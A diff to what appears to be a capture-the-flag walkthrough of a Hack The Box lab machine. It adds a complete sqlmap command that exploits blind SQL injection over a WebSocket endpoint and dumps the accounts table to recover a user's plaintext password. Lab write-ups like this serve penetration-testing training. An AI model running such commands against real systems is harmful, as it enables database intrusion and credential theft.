@@ -62,7 +62,7 @@
 
 8. Since this is a blind SQLi vulnerability, we won't exploit this manually but use SqlMap. Luckily, SqlMap is compatible with WebSockets, so we use it to enumerate the database and get user player's plaintext password!
 
-``
+`sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "59286"}' --batch --level 5 --risk 3 --dbms mysql --threads 5 -D soccer_db -T accounts --dump`
 
 <img width="913" height="1194" alt="image" src="https://github.com/user-attachments/assets/9e73d8dd-36ba-4d11-b737-3fde8af06413" />
 
